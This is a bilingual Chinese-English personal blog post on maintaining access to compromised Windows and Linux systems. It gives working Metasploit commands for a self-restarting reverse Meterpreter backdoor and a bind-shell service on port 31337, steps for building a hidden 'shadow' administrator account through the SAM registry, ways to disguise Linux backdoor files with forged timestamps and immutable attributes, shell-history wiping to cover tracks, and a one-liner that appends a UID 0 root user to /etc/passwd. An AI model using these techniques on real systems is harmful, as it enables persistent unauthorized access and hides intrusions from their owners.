<!DOCTYPE html>












  


<html class="theme-next gemini use-motion" lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">

















  <meta name="baidu-site-verification" content="wD6I1h8lGi">









<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">

<link rel="stylesheet" href="/css/main.css?v=7.1.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.2">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.2">


  <link rel="mask-icon" href="/images/logo.svg?v=7.1.2" color="#222">







<script id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '7.1.2',
    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
    back2top: true,
    back2top_sidebar: false,
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Privilege maintenanceRecord i">
<meta property="og:type" content="article">
<meta property="og:title" content="Privilege maintenance&#x2F;权限维持初探">
<meta property="og:url" content="http://ama666.cn/2021/02/12/privilege maintance/index.html">
<meta property="og:site_name" content="ama666">
<meta property="og:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Privilege maintenanceRecord i">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212170929.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173645.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173724.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173922.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212175054.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216143955.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216145016.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212170929.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173645.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173724.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173922.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212175054.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216143955.png">
<meta property="og:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216145016.png">
<meta property="og:updated_time" content="2021-10-23T02:31:02.464Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Privilege maintenance&#x2F;权限维持初探">
<meta name="twitter:description" content="This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down. 本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。 Privilege maintenanceRecord i">
<meta name="twitter:image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212170929.png">





  
  
  <link rel="canonical" href="http://ama666.cn/2021/02/12/privilege maintance/">



<script id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Privilege maintenance/权限维持初探 | ama666</title>
  












  <noscript>
  <style>
  .use-motion .motion-element,
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-title { opacity: initial; }

  .use-motion .logo,
  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">ama666</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <p class="site-subtitle">平时多喝点茶</p>
      
    
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="切换导航栏">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">

    
    
    
      
    

    

    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-about">

    
    
    
      
    

    

    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">

    
    
    
      
    

    

    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">

    
    
    
      
    

    

    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">

    
    
    
      
    

    

    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>

  </li>
        
        
        
          
          <li class="menu-item menu-item-sitemap">

    
    
    
      
    

    

    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>

  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ama666.cn/2021/02/12/privilege maintance/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="安大侠">
      <meta itemprop="description" content="每天挣扎的活着">
      <meta itemprop="image" content="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ama666">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Privilege maintenance/权限维持初探

              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2021-02-12 15:17:56" itemprop="dateCreated datePublished" datetime="2021-02-12T15:17:56+08:00">2021-02-12</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">更新于</span>
                
                <time title="修改时间：2021-10-23 10:31:02" itemprop="dateModified" datetime="2021-10-23T10:31:02+08:00">2021-10-23</time>
              
            
          </span>

          

          
            
            
          

          
          

          
            <span class="post-meta-divider">|</span>
            <span class="post-meta-item-icon">
            <i class="fa fa-eye"></i>
             阅读次数： 
            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
            </span>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>This article is written in Chinese and English, and the content is exactly the same. To view the Chinese version, please scroll down.</p>
<p>本篇文章采用中文和英文两种语言编写，内容完全相同。如需查看中文版请下滑。</p>
<h1 id="Privilege-maintenance"><a href="#Privilege-maintenance" class="headerlink" title="Privilege maintenance"></a>Privilege maintenance</h1><p>Record in two categories</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>After leaving the shellcode in the target system, it simply resides in the memory and will disappear after restarting. Backdoor implantation is required to maintain permissions for a long time.</p>
<h3 id="MSF-persistence"><a href="#MSF-persistence" class="headerlink" title="MSF persistence"></a>MSF persistence</h3><p>The first is the persistence module of MSF penetration testing.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -i 5 -r ip -p port</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST ip</span><br><span class="line">set LPORT port</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>Open the back door, it will automatically start when the system service starts, and it will connect back every 5 seconds. This method needs to work after BypassUAC. Because this method will add boot auto-start in the registry <code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>. Failure to bypass UAC due to permission issues will cause startup failure. Of course, msf also provides many modules to bypass UAC.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212170929.png" alt></p>
<h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><p>Provide a backdoor by opening a service on the target host that has a shell.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set RHOST ip</span><br><span class="line">set LPORT 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>After the execution is successful, a folder with a random name will be created in the C:WindowsTEMP directory, and three files <code>metsvc.dll, metsvc-server.exe, and metsvc.exe</code> will be generated in it. A service named Metsvc will also be started to automatically bind to port 31337.</p>
<h3 id="Create-a-shadow-account"><a href="#Create-a-shadow-account" class="headerlink" title="Create a shadow account"></a>Create a shadow account</h3><p>The first two are all permission maintenance completed by the msf tool, and you can also maintain permissions by manually creating an account. This account cannot be viewed using the <code>net user</code> command, only in the registry. In Windows, if you add a <code>$</code> after the user name, you can achieve the goal. Up to this point is a hidden account, and the shadow account, as the name suggests, is the same as the ontology (administrator) account, but it is invisible.</p>
<p>Adding an account requires system permissions, but administrator permissions are not enough, because morenzhucebiao <code>HKEY_LOCAL_MACHINE\SAM\SAM\</code> can only be modified with system permissions.</p>
<p>First, you need to create a hidden account, <code>shadow&amp;</code>:<code>shadow</code>.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173645.png" alt></p>
<p>Although this account cannot be seen with the net user command, it can be seen in the control panel</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173724.png" alt></p>
<p>Then enter regedit in win+R to open the registry and find <code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Name</code>. One can see our newly created hidden account. Everywhere this registry is named <code>1.reg</code>. Next, observe the Type in this registry, and you can find the registry with the same name in the upper-level directory.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173922.png" alt></p>
<p>Export it in the same way and name it <code>2.reg</code>. Generally, the type of the <code>Administrator</code> user of Windwos is <code>1F4</code>, and the registry with the same name is found, usually the first one, and the export name is <code>3.ref</code>. Replace the key value of F in <code>2.reg</code> with the corresponding key value in <code>3.reg</code>. Next, use the net user command to delete the shadow$ account. After completion, double-click the two imported registries to successfully create the shadow account. In this way, the <code>shadow$</code> account cannot be seen in other places except in the registry.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212175054.png" alt></p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="Hidden-file-backdoor"><a href="#Hidden-file-backdoor" class="headerlink" title="Hidden file backdoor"></a>Hidden file backdoor</h3><p>A file under windows has creation time, modification time and access time. In contrast to the file modification time, access time and status change time under Linux, you can use the <code>stat</code> command to view. The backdoor file can be found by comparing the modification time of the file. Therefore, if you want to hide the backdoor, you must change the timestamp of the backdoor file, which can be achieved with the <code>touch -r</code> command.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216143955.png" alt></p>
<p>Use the <code>chattr</code> command to lock the file so that it will not be easily deleted. The added non-deletable attributes cannot be seen using the <code>ls -al</code> command, but can only be seen using <code>lsattr</code>.</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216145016.png" alt></p>
<p>After performing a series of operations, you need to clean up the execution command records. You can view it through <code>history</code>, and use the <code>-d</code> parameter to delete the corresponding line.</p>
<h3 id="Add-user"><a href="#Add-user" class="headerlink" title="Add user"></a>Add user</h3><p>Linux adds users in the next sentence, but there is no response. The following are four ways to add a user whose username and password are <code>ama666:123456</code>.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useradd ama666;echo'ama666:123456'|chpasswd</span><br><span class="line">useradd -p `openssl passwd 123456` ama666</span><br><span class="line">useradd -p "$(openssl passwd 123456)" ama666</span><br><span class="line">useradd ama666;echo -e "123456n123456n" |passwd ama666</span><br></pre></td></tr></table></figure>

<p>To add a user to play, you need to give the user root privileges.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo "ama666:x:0:0::/:/bin/sh" &gt;&gt; /etc/passwd</span><br><span class="line">echo'ama666:123456'|chpasswd</span><br></pre></td></tr></table></figure>

<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><p>分两类记录一下</p>
<h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><p>在目标系统中留下shellcode之后，仅仅是驻留在内存中，重新启动就会消失。需要进行后门植入才能长期的维持权限。</p>
<h3 id="MSF-persistence-1"><a href="#MSF-persistence-1" class="headerlink" title="MSF persistence"></a>MSF persistence</h3><p>首先就是MSF的渗透测试persistence模块。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -i 5 -r ip -p port</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST ip</span><br><span class="line">set LPORT port</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>开启后门，在系统服务启动时自动启动，每5秒回连一次。这个方法需要在BypassUAC之后才能起作用。因为该方式会在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code>中添加开机自启动。由于权限问题不绕过UAC会导致启动失败。当然msf也提供了很多模块绕过UAC。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212170929.png" alt></p>
<h3 id="Metsvc-1"><a href="#Metsvc-1" class="headerlink" title="Metsvc"></a>Metsvc</h3><p>通过已有shell的目标主机上开启一个服务来提供后门。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">set RHOST ip</span><br><span class="line">set LPORT 31337</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>执行成功后，会在C:WindowsTEMP目录下新建随机名称的文件夹，里面生成3个文件<code>metsvc.dll、metsvc-server.exe、metsvc.exe</code>。也会启动一个名为Metsvc的服务自动绑定在31337端口。</p>
<h3 id="建立影子账户"><a href="#建立影子账户" class="headerlink" title="建立影子账户"></a>建立影子账户</h3><p>前面两个都是通过msf工具来完成的权限维持，也可以通过手动创建一个账户来维持权限。该账户无法使用<code>net user</code>命令查看到，只能在注册表中看到。在Windows中，如果在用户名后面添加一个<code>$</code>就可以达到目的。到这里是一个隐藏账户，而影子账户顾名思义，就是和本体(管理员)相同，却又看不到的账户。</p>
<p>添加账户需要的是system权限，administrator权限是不行的，因为morenzhucebiao<code>HKEY_LOCAL_MACHINE\SAM\SAM\</code>只有system权限才能修改。</p>
<p>首先需要建立一个隐藏账户，<code>shadow&amp;</code>:<code>shadow</code>。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173645.png" alt></p>
<p>这个账户虽然用net user命令看不到，但是在控制面板能看到</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173724.png" alt></p>
<p>然后win+R输入regedit打开注册表，找到<code>HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/Name</code>。其中能看到我们新创建的隐藏账户。到处这个注册表命名为<code>1.reg</code>。接下来观察这张注册表中的Type，在上级目录下能找到同名注册表。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212173922.png" alt></p>
<p>同样导出，命名为<code>2.reg</code>。一般Windwos的<code>Administrator</code>用户的Type为<code>1F4</code>，找到同名注册表，一般都是第一个，导出命名为<code>3.ref</code>。将<code>2.reg</code>中F的键值替换为<code>3.reg</code>中对应的键值。接下来使用net user命令删除shadow$账户，完成之后双击导入的两个注册表，成功创建了影子账户。这样除了注册表中，其他位置均无法看到<code>shadow$</code>账户。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210212175054.png" alt></p>
<h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><h3 id="隐藏文件后门"><a href="#隐藏文件后门" class="headerlink" title="隐藏文件后门"></a>隐藏文件后门</h3><p>windows下一个文件有创建时间，修改时间和访问时间。对照在Linux下文件有修改时间，访问时间和状态改变时间，可以使用<code>stat</code>命令查看。可以通过比对文件的修改时间来找到后门文件。因此想要隐藏后门，就必须更改后门文件的时间戳，可以用<code>touch -r</code>命令实现。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216143955.png" alt></p>
<p>使用<code>chattr</code>命令来锁定文件使文件不会被轻易删除。添加的不可删除属性无法使用    <code>ls -al</code>命令看到，只能使用<code>lsattr</code>才能看到。</p>
<p><img src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20210216145016.png" alt></p>
<p>进行完一系列操作后，需要对执行命令记录进行清扫。可以通过<code>history</code>查看，并使用<code>-d</code>参数删除对应的行。</p>
<h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>Linux下一句话添加用户，没有回显。以下是四种方式添加用户名密码为<code>ama666:123456</code>的用户。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">useradd ama666;echo 'ama666:123456'|chpasswd</span><br><span class="line">useradd -p `openssl passwd 123456` ama666</span><br><span class="line">useradd -p "$(openssl passwd 123456)" ama666</span><br><span class="line">useradd ama666;echo -e "123456n123456n" |passwd ama666</span><br></pre></td></tr></table></figure>

<p>添加玩用户需要给用户赋予root权限。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo "ama666:x:0:0::/:/bin/sh" &gt;&gt; /etc/passwd</span><br><span class="line">echo 'ama666:123456'|chpasswd</span><br></pre></td></tr></table></figure>


      
    </div>

    

    
    
    

    

    
      
    
    

    
      <div>
        




  



<ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者： </strong>安大侠</li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    
    <a href="http://ama666.cn/2021/02/12/privilege maintance/" title="Privilege maintenance/权限维持初探">http://ama666.cn/2021/02/12/privilege maintance/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
</ul>

      </div>
    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/02/09/SSRF Bypass/" rel="next" title="SSRF Bypass/SSRF中的Bypass">
                <i class="fa fa-chevron-left"></i> SSRF Bypass/SSRF中的Bypass
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/03/01/Apache-Flink-RCE Reproduction/" rel="prev" title="Apache-Flink RCE Reproduction/Apache-Flink RCE复现">
                Apache-Flink RCE Reproduction/Apache-Flink RCE复现 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="https://raw.githubusercontent.com/Annnnnnnnn/images/master/img/20190616124508.png" alt="安大侠">
            
              <p class="site-author-name" itemprop="name">安大侠</p>
              <div class="site-description motion-element" itemprop="description">每天挣扎的活着</div>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">66</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  
                    
                      <a href="/categories/">
                    
                  
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">12</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  
                    
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">3</span>
                    <span class="site-state-item-name">标签</span>
                  
                </div>
              
            </nav>
          

          

          

          

          
             <div class="cc-license motion-element" itemprop="license">
              
              
                
              
              
              
              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
             </div>
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://hengyud.cn" title="https://hengyud.cn" rel="noopener" target="_blank">小P</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://blog.lookupes.cn" title="http://blog.lookupes.cn" rel="noopener" target="_blank">孙哥</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://timeshu.github.io" title="https://timeshu.github.io" rel="noopener" target="_blank">Time</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://zo1ro.github.io" title="http://zo1ro.github.io" rel="noopener" target="_blank">imy0r1in</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
                  </li>
                
              </ul>
            </div>
          

          
            
          
          

        </div>
      </div>

      
      <!--noindex-->
        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
            
            
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Privilege-maintenance"><span class="nav-number">1.</span> <span class="nav-text">Privilege maintenance</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows"><span class="nav-number">1.1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF-persistence"><span class="nav-number">1.1.1.</span> <span class="nav-text">MSF persistence</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metsvc"><span class="nav-number">1.1.2.</span> <span class="nav-text">Metsvc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Create-a-shadow-account"><span class="nav-number">1.1.3.</span> <span class="nav-text">Create a shadow account</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">1.2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hidden-file-backdoor"><span class="nav-number">1.2.1.</span> <span class="nav-text">Hidden file backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Add-user"><span class="nav-number">1.2.2.</span> <span class="nav-text">Add user</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#权限维持"><span class="nav-number">2.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-1"><span class="nav-number">2.1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#MSF-persistence-1"><span class="nav-number">2.1.1.</span> <span class="nav-text">MSF persistence</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Metsvc-1"><span class="nav-number">2.1.2.</span> <span class="nav-text">Metsvc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#建立影子账户"><span class="nav-number">2.1.3.</span> <span class="nav-text">建立影子账户</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-1"><span class="nav-number">2.2.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#隐藏文件后门"><span class="nav-number">2.2.1.</span> <span class="nav-text">隐藏文件后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#添加用户"><span class="nav-number">2.2.2.</span> <span class="nav-text">添加用户</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </div>
      <!--/noindex-->
      

      

    </div>
  </aside>
  


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">安大侠</span>

  

  
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>




        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="post-meta-item-icon">
      <i class="fa fa-user"></i>
    </span>
    <span class="site-uv" title="总访客量">
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
    </span>
  

  
    <span class="post-meta-divider">|</span>
  

  
    <span class="post-meta-item-icon">
      <i class="fa fa-eye"></i>
    </span>
    <span class="site-pv" title="总访问量">
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
  
</div>









        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>


























  
  <script src="/lib/jquery/index.js?v=3.4.1"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
